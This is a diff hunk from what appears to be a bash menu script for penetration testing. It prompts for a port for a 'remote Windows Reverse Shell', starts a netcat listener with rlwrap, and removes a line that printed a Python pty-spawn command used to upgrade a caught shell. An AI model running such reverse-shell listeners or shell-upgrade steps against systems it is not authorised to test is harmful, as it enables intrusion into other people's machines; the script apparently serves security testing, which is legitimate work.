@@ -1335,7 +1335,6 @@ while true; do
 		read -p "digit a number of port for the remote Windows Reverse Shell: " PORTA
 		if [[ "$PORTA" =~ ^[0-9]+$ ]];
 		then
-			echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
 			rlwrap nc -lvnp $PORTA
 		fi
 	;;
